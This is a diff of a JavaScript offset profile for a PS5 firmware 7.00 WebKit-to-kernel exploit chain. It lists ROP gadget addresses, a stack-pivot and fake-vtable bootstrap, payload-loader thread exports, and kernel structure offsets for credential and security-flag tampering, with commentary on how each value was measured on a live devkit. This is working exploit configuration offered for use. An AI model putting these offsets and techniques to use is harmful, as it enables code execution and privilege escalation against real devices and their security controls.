@@ -1,198 +1,31 @@
-// 07.00 (devkit, PS5UPDATE-devkit-7_00_00_44) -- generated from
-// libSceNKWebKit / libkernel_web / libSceLibcInternal / 700_dvk_kernel.elf.
-// file offset = rva + 0x4000
+// PS5 7.00 offsets - generated from decrypted firmware modules
+// source: 7_Firmware 07.00.00_PS5UPDATE
 
-// host-constructor candidates: webkitBase = nativeCtorAddr - hc
-// parseInt's NativeExecutable::m_constructor is callHostFunctionAsConstructor
-// (JSObject.cpp passes it to JSFunction::create for every putDirectNativeFunction).
-// This build has clang CFI, so the *address-taken* value is the function's
-// jump-table entry, NOT its body: the body is at 0x003B5780 and three 8-byte
-// `jmp rel32; int3 int3 int3` slots point at it. Only 0x00010AE8 yields a
-// 0x4000-aligned base (measured ctor 0x835470ae8 -> base 0x835460000); main.js
-// rejects the other two on alignment, exactly as it does for 9.00's three.
-const OFFSET_wk_host_constructor_candidates = [0x00010AE8, 0x00010590, 0x000114C0];
-// vtable[0] of HTMLTextAreaElement - the ICF-folded WebCore Element destructor, which
-// is slot 0 of 201 vtables of 150+ slots in this NKWebKit (retail and devkit agree).
-// 7.00 is BELOW 9.00, so main.js really does take the vtable branch here; it used to
-// carry the WKDownloadGetTypeID export 0x006E6910 like the 9.00+ files do, where the
-// branch is dead. That value is slot 0 of nothing longer than a 20-slot vtable and would
-// have produced a wrong WebKit base on the first read. Derived 2026-08-26 by a method
-// that reproduces the shipped value on all nine other sub-9.00 firmwares, 8.20 among
-// them, whose value is confirmed by hardware. See E:\ps5\dwarf\P2JB_RE\REPORT.md.
-const OFFSET_wk_vtable_first_element     = 0x0003D720;
-// Import GOT slots, MEASURED on the console, not taken from the relocation
-// tables. DT_JMPREL/DT_RELA give r_offset 0x03E16EE0 (memset, 8zTFvBIAIN8#P#Q)
-// and 0x03E14910 (__stack_chk_guard, f7uOxY9mM1U#C#D), but at runtime those
-// two addresses hold WebKit-internal code pointers -- they are in .data.rel.ro
-// among the vtables, not in the import GOT. Sweeping the RW data segments for
-// pointers leaving the module and testing them against the known symbol
-// offsets found the real slots exactly one 16KB page higher, independently for
-// both symbols:
-//   __stack_chk_guard  reloc 0x03E14910 -> real 0x03E18910   (+0x4000)
-//   memset             reloc 0x03E16EE0 -> real 0x03E1AEE0   (+0x4000)
-// Measured values: guard 0x80e5411d0 -> libkernel_web 0x80e4d4000,
-// memset 0x82b9cce70 -> libSceLibcInternal 0x82b9b8000; both 0x4000-aligned and
-// both inside their module's image. If another firmware's profile is ever
-// derived the same way, check for this page bias before trusting r_offset.
-const OFFSET_wk_memset_import                  = 0x03E1AEE0;
-const OFFSET_wk___stack_chk_guard_import       = 0x03E18910;
+const OFFSET_wk_host_constructor_candidates = [0x00010590, 0x00010AE8, 0x000114C0];
+const OFFSET_wk_vtable_first_element     = 0;
+const OFFSET_wk_memset_import                  = 0x03E16EE0;
+const OFFSET_wk___stack_chk_guard_import       = 0x03E14910;
 
 const OFFSET_lk___stack_chk_guard              = 0x0006D1D0;
+const OFFSET_lk__thread_list                   = 0x00064218;
+const OFFSET_lk_worker_wait_return             = 0x000389B1;
 const OFFSET_lk_pthread_create_name_np         = 0x00001CE0;
 const OFFSET_lk_pthread_join                   = 0x00032820;
 const OFFSET_lk_pthread_exit                   = 0x00022630;
-// Stage-5 payload loader ABI.  These exact scePthread exports are used by the
-// original AioShellcode loader together with an explicit 0x80000-byte stack.
-const OFFSET_lk_scePthreadCreate               = 0x0000E220;
-const OFFSET_lk_scePthreadJoin                 = 0x00014A40;
-const OFFSET_lk_scePthreadAttrInit             = 0x000295F0;
-const OFFSET_lk_scePthreadAttrSetstacksize     = 0x000176C0;
-const OFFSET_lk_scePthreadAttrSetdetachstate   = 0x00016EC0;
-const OFFSET_lk_scePthreadAttrDestroy          = 0x00020530;
-const OFFSET_lk_sceKernelSendNotificationRequest = 0x00008BE0;
-const OFFSET_lk_sysctlbyname                   = 0x00027330;
-const OFFSET_lk_pthread_create                 = 0x00030150;
-const OFFSET_lk_getpid                         = 0x00036760;
-// TAILQ head written by _thr_link()'s TAILQ_INSERT_HEAD at 0x0002B960
-// (tle at +0x38, as main.js assumes).  Same address as 9.00-13.60.
-const OFFSET_lk__thread_list                   = 0x00064218;
-/* Saved PC the idle Worker parks on, as a RANKED list -- main.js takes the
- * first entry that appears exactly once on the worker stack.
- *
- * MEASURED on a live 7.00 devkit, not read off the binary. The static guess
- * 0x389B1 ("return address of the blocking call inside cond_wait_common
- * 0x38840, the branch pthread_cond_wait takes") is NOT on the stack -- the
- * fingerprint scan found 0 of it. Sweeping the parked worker stack for
- * libkernel pointers produced this chain, newest frame (lowest offset) first:
- *
- *     0x7fb28  lk+0x2d85c   umtx wait wrapper (deepest, in the syscall)
- *     0x7fb48  lk+0x39843   _thr_ucond_wait
- *     0x7fb78  lk+0x38f31   cond_wait_common      <-- 0x38840 + 0x6f1
- *     0x7fc38  lk+0x33d1e   pthread_cond_wait
- *     0x7ffc8  lk+0x39ac0   thread entry (oldest)
- *
- * i.e. exactly libthr's pthread_cond_wait -> cond_wait_common ->
- * _thr_ucond_wait -> _thr_umtx_timedwait_uint. 0x38F31 is the same function
- * the original constant aimed at, just the call site that actually runs, so
- * it keeps the intended pivot frame. The other two are ranked behind it as
- * fallbacks in case a future build shifts that call.
- * The cond_wait selector at lk+0x64014 reads 1 on this console, confirming
- * pthread_cond_wait really does take the 0x38840 body -- so the wrong-body
- * explanation is ruled out and the call site is the whole story.
- * previous (never matched): 0x000389B1 */
-const OFFSET_lk_worker_wait_return             = [0x00038F31, 0x00039843, 0x00033D1E];
-// Byte that selects WHICH cond_wait_common body pthread_cond_wait calls:
-// 1 -> 0x38840 (the body 0x389B1 above was taken from), 0 -> 0x38BE0.
-// probe700.html reads this too. main.js reports it when the fingerprint scan
-// comes up empty, because a fingerprint from the body that is NOT running can
-// never appear on the stack.
-const OFFSET_lk_cond_wait_selector             = 0x00064014;
 const OFFSET_lk_sleep                          = 0x00025C50;
 const OFFSET_lk_sceKernelGetCurrentCpu         = 0x000028A0;
 
 const OFFSET_lc_memset                         = 0x00014E70;
-const OFFSET_lc_malloc                         = 0x00005E80;
-const OFFSET_lc_free                           = 0x00005E90;
-const OFFSET_lc_memcpy                         = 0x00003CD0;
-const OFFSET_lc_strcmp                         = 0x000408D0;
-const OFFSET_lc_memcmp                         = 0x00040890;
-const OFFSET_lc_vsnprintf                      = 0x0005C620;
 const OFFSET_lc_setjmp                         = 0x0005AF10;
 const OFFSET_lc_longjmp                        = 0x0005AF60;
 
-// Fallback estimate only; main.js fingerprints the saved worker PC at runtime.
-const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB68;
+const OFFSET_WORKER_STACK_OFFSET         = 0x0007FB88;
 
-// --- gadget substitutions unique to this build ------------------------------
-// CORRECTED 2026-08-28.  The text below used to claim this libSceNKWebKit "has
-// no `pop r9 ; ret` anywhere in .text", and shipped a zeroing stand-in at
-// 0x010BF949 (45 31 c9 4d 85 c9 0f 95 c0 c3 = xor r9d,r9d ; test ; setne al ;
-// ret) with OFFSET_wk_r9_zero_only = true.  That claim is FALSE.  Read straight
-// out of both dumps, retail and devkit:
-//     rva 0x002773C6 = 47 59 c3  -> REX.B + pop rcx = a REAL `pop r9 ; ret`
-//     rva 0x00214613 = 5a c3     -> a REAL `pop rdx ; ret`
-// So this build needs no r9 stand-in at all.  "pop r9" now points at the real
-// gadget and the flag is false, which makes 7.00 structurally identical to
-// 7.01-8.60 (all of which are also real `pop r9 ; ret`, verified byte-for-byte)
-// and takes verify2 from 25/26 to 26/26 on retail and devkit.
-//
-// Worth remembering: NO shipped engine ever read this flag - it is honoured only
-// in slopdev/slopkit/rop.js.  So while the flag said "consumes no stack slot",
-// poopsploit/poop2jb were pushing gadget AND value, i.e. one stack slot the
-// gadget never popped.  A workaround is evidence someone could not find a
-// gadget, not evidence it is absent.
-const OFFSET_wk_r9_zero_only             = false;
-// "cmp [rcx], eax" is really `cmp eax, [rcx] ; ret`, i.e. the operands are
-// swapped.  ZF is unaffected by the swap, so branch_types.EQUAL (the only
-// type the engine uses) is exact; rop.js throws on the ordered types.
-const OFFSET_wk_cmp_operands_reversed    = true;
-/* `mov [rdi], rsi ; ret` at 0x7527F0 is NOT that instruction on this build.
- * Established by execution, since the text is execute-only and cannot be read:
- *   probe=rsp  SILENT -- pop rsp 0x6EEE1 and the stack switch both work
- *   probe=p    SILENT -- pop rdi 0x31434 and pop rsi 0xB7098 each consume
- *                        exactly one stack slot and return correctly
- *   probe=w    CRASH  -- those same two pops PLUS this store, twice
- * The store is the only difference between the last two, so 0x7527F0 is it.
- * Route 8-byte stores through `mov [rdi], rax` 0x79337 instead. That one is
- * cross-checked by its own neighbour: "mov [rdi], eax" is 0x79338, exactly one
- * byte later, which is what `48 89 07 C3` vs `89 07 C3` looks like -- the same
- * store with the REX prefix skipped. 0x7527F0 has no such corroboration.
- * rop.js honours this in push_write8, push_copy8 and push_write_ptr8. */
-const OFFSET_wk_store_via_rax            = true;
-/* Run the gadget conformance suite once prepare() succeeds. This whole profile
- * came out of the same generator that produced the bad 0x7527F0, and the text
- * is execute-only so nothing here can be verified by reading it. With a working
- * chain the remaining gadgets CAN be checked by executing them and comparing
- * the result, which beats discovering the next bad one by bisecting crashes. */
-const OFFSET_wk_gadget_selftest          = true;
-
-// --- 7.00 bootstrap: the idle-Worker hijack does not work on JSC 613 --------
-// The Worker never parks at a return address any stack scan can find (its wait
-// is a raw syscall; the PLT is `jmp [GOT]`, so nothing rets through a slot we
-// control). Instead we fake a C++ vtable on the leaked textarea impl, take one
-// virtual dispatch to get `rdi = this`, and pivot with longjmp. main.js runs a
-// non-destructive milestone first to confirm the virtual call and find the
-// trigger op; OFFSET_wk_vtable_trigger is filled in once the device reports it.
-const OFFSET_wk_bootstrap                 = "";  // JIT-less: JS-frame (LLInt) pivot is not viable; native worker-stack hijack is the JIT-independent path
-// mov rsp, rdi ; ret  -- the pivot for a `rdi = this` virtual call (fallback;
-// longjmp is used as the primary pivot since its jmp_buf is fully attacker-built:
-// +0x00 rip, +0x10 rsp, standard FreeBSD amd64 layout, confirmed in libc 613).
-const OFFSET_wk_stack_pivot_mov_rsp_rdi   = 0x0080C579;
-// set once the milestone reports which JS/DOM op yielded the virtual call
-const OFFSET_wk_vtable_trigger            = "";
-// 7.00's JSC is 613.1; 9.00+ is 616.1. JSArrayBufferView gained a
-// `size_t m_byteOffset` member between them, so the tail differs:
-//   613: +0x18 size_t m_length, +0x20 uint32 m_mode              sizeof 0x28
-//   616: +0x18 size_t m_length, +0x20 size_t m_byteOffset,
-//        +0x28 uint8  m_mode                                     sizeof 0x30
-// Measured on this console: structureID 0xdc63, butterfly 0x881a24038,
-// m_vector 0x881a7ae00, m_length 0x100, and +0x20 = 02 00 00 00 --
-// TypedArrayMode 2 == WastefulTypedArray, which is exactly what
-// `new Uint8Array(new ArrayBuffer(0x100))` must be. core.js checks m_mode
-// here instead of the m_byteOffset that this version does not have.
-const OFFSET_jsc_abv_mode_at_0x20        = true;
-
-/* VERIFIED byte-for-byte on 2026-08-21 against
- * PS5UPDATE-devkit-7_00_00_44 .. system_ex_b/common_ex/lib/libSceNKWebKit.sprx
- * (PT_LOAD[0]: vaddr 0, file offset 0x4000, so file = rva + 0x4000).
- * Every entry below decodes to exactly the instruction its name claims, with
- * two deliberate exceptions, both already flagged above:
- *   pop r9        0x010BF949 = 45 31 c9 4d 85 c9 0f 95 c0 c3  (the zeroing
- *                 stand-in; OFFSET_wk_r9_zero_only)
- *   cmp [rcx],eax 0x035F9049 = 3b 01 c3  (operands reversed;
- *                 OFFSET_wk_cmp_operands_reversed)
- * The executable segment runs 0x0 .. 0x3673D22 (54.5 MB), so every address
- * here is inside it. An earlier reading of the probe results -- that text
- * ended near 1.2 MB and the high gadgets pointed into data -- was WRONG;
- * the chain crashes have another cause. */
 let wk_gadgetmap = {
 	"ret": 0x00000042,
 	"pop rdi": 0x00031434,
 	"pop rsi": 0x000B7098,
-	// 0x21461C, not the 0x214613 this profile shipped: verified `5a c3` in
-	// system_ex_b/common_ex/lib/libSceNKWebKit.sprx from
-	// PS5UPDATE-devkit-7_00_00_44. 0x214613 is not a pop.
-	"pop rdx": 0x0021461C,
+	"pop rdx": 0x00214613,
 	"pop rcx": 0x00032473,
 	"pop rax": 0x000A6CAB,
 	"pop rsp": 0x0006EEE1,
@@ -548,27 +381,69 @@ let syscall_map = {
 	0x2D5: 0x00037630,
 };
 
-// Firmware-specific kernel offsets, from 700_dvk_kernel.elf (already the
-// unwrapped kernel; the SLB2-wrapped copy is kernel.dec.bin).  Text-relative
-// except for the two invariant syscall-stack frame offsets.  Nothing in the
-// engine reads these -- allproc is walked at runtime -- so the four Sony
-// flag words below are left at 0 rather than guessed.
-const OFFSET_KERNEL_STACK_COOKIE                = 0x00000930;
-const OFFSET_KERNEL_STACK_SYS_SCHED_YIELD_RET   = 0x00000808;
-// kdata_base = text_base + text_size = 0xffffffff80210000 + 0xC50000.
-const OFFSET_KERNEL_DATA                        = 0x00C50000;
-const OFFSET_KERNEL_SYS_SCHED_YIELD_RET         = 0x00000000; // not derived
-// LIST_INIT(&allproc) in procinit() at 0xffffffff8074DEBB -> kdata+0x2859D50.
-const OFFSET_KERNEL_ALLPROC                     = 0x034A9D50;
-/* Derived 2026-08-25 by rip-relative signature vote against this firmware own
- * x86_kernel.elf (retail I:/americana and devkit I:/EXTRACTED agree).
- * SECURITY_FLAGS voted 0x01718064 from the 7.01, 8.00 and 12.00 anchors, and is
- * independently equal to the 7.01 file value on an identical OFFSET_KERNEL_DATA
- * (0x00C50000), so 7.00 and 7.01 share this kdata layout. TARGETID/QA/UTOKEN follow
- * the fixed in-block deltas +0x09/+0x24/+0x8C that hold on every other firmware. */
-const OFFSET_KERNEL_SECURITY_FLAGS              = 0x01718064;
-const OFFSET_KERNEL_TARGETID                    = 0x0171806D;
-const OFFSET_KERNEL_QA_FLAGS                    = 0x01718088;
-const OFFSET_KERNEL_UTOKEN_FLAGS                = 0x017180F0;
-// VFS_ROOT(mp, LK_EXCLUSIVE, &rootvnode) at 0xffffffff80E2BCFA -> kdata+0x30C7510.
-const OFFSET_KERNEL_ROOTVNODE                   = 0x03D17510;
+const OFFSET_KERNEL_ALLPROC                    = 0x034A9D50;
+const OFFSET_KERNEL_SECURITY_FLAGS             = 0x01718064;
+const OFFSET_KERNEL_TARGETID                   = 0x01718064 + 0x09;
+const OFFSET_KERNEL_QA_FLAGS                   = 0x01718064 + 0x24;
+const OFFSET_KERNEL_UTOKEN_FLAGS               = 0x01718064 + 0x8C;
+const OFFSET_KERNEL_ROOTVNODE                  = 0x03D17510;
+const OFFSET_KERNEL_VMSPACE_P_ROOT             = 0x1d0;
+const OFFSET_KERNEL_VMSPACE_VM_PMAP            = 0x2e8;
+const OFFSET_KERNEL_DATA                       = 0x00C50000;
+
+window.KRW = {
+    firmware: "7.00",
+    kernelData: OFFSET_KERNEL_DATA,
+    allproc:    OFFSET_KERNEL_ALLPROC,
+    rootvnode:  OFFSET_KERNEL_ROOTVNODE,
+    kaslr: { mode: "rtmsg2", retStatic: 0x00A83731, retLow16: 0x3731 },
+    oid: {
+        originalKind: 0x80048002,
+        writableKind: 0x70048002,
+        a: {
+            base: 0x027706C8, kind: 0x027706DC, kindByte3: 0x027706DF,
+            arg1: 0x027706E0, arg1Byte1: 0x027706E1, arg1Value: 0x027706B8,
+            deadSink: 0x027706E8,
+        },
+        b: {
+            base: 0x027705A0, kind: 0x027705B4, kindByte3: 0x027705B7,
+            arg1: 0x027705B8, arg1Value: 0x027704D0, visible: 0x027705F0,
+        },
+        c: {
+            base: 0x02A92FA8, kind: 0x02A92FBC, arg1: 0x02A92FC0,
+            arg1Value: 0x03C93F3C, mib: [9, 8],
+        },
+    },
+    walkCounter: { addr: 0x03C93F38, mib: [9, 7] },
+    nodeMutex: 0x01A6FE18,
+    rodataProbe: { rva: 0x01010A7A, text: "_aio_submit_cmd" },
+    aio: {
+        waiterSize: 0x38, requestSize: 0x28,
+        group: { num: 0x00, state: 0x08, waiters: 0x50 },
+        idTable: { pages: 0x220, slotStride: 0x30, entryType: 0x160 },
+    },
+    proc: { pid: 0x0bc, ucred: 0x040, fd: 0x048, aioInfo: 0x0c38, dynlib: 0x3e8 },
+    kernelPid: 0,
+    ucred: { uid: 0x04, ruid: 0x08, svuid: 0x0c, ngroups: 0x10, rgid: 0x14, svgid: 0x18,
+        sceAuthId: 0x58, sceCaps: 0x60, sceCaps1: 0x68, sceAttrs: 0x80 },
+    sysCoreAuthId: { lo: 0x00000007, hi: 0x48000000 },
+    filedesc:      { files: 0x00, cdir: 0x08, rdir: 0x10, jdir: 0x18 },
+    filedescTable: { nfiles: 0x00, ofiles: 0x08, entryStride: 0x30, fileData: 0x00 },
+    pipe: { count: 0x00, in: 0x04, out: 0x08, size: 0x0c, buffer: 0x10, pair: 0xe8, defaultSize: 0x4000 },
+    dynlib: { syscallStart: 0xf0, syscallEnd: 0xf8, restrictFlags: 0x118, libkernelRef: 0x18 },
+};
+window.SYMBOLS = {
+    libkernel: {
+        getpid:                           0x00036760,
+        sysctlbyname:                     0x00027330,
+        sceKernelSendNotificationRequest: 0x00008BE0,
+        pthread_create:                   0x00030150,
+        pthread_create_name_np:           0x00001CE0,
+        pthread_join:                     0x00032820,
+    },
+    libc: {
+        malloc: 0x00005E80, free: 0x00005E90, memcpy: 0x00003CD0,
+        memset: 0x00014E70, strcmp: 0x000408D0, memcmp: 0x00040890,
+        vsnprintf: 0x0005C620,
+    },
+};
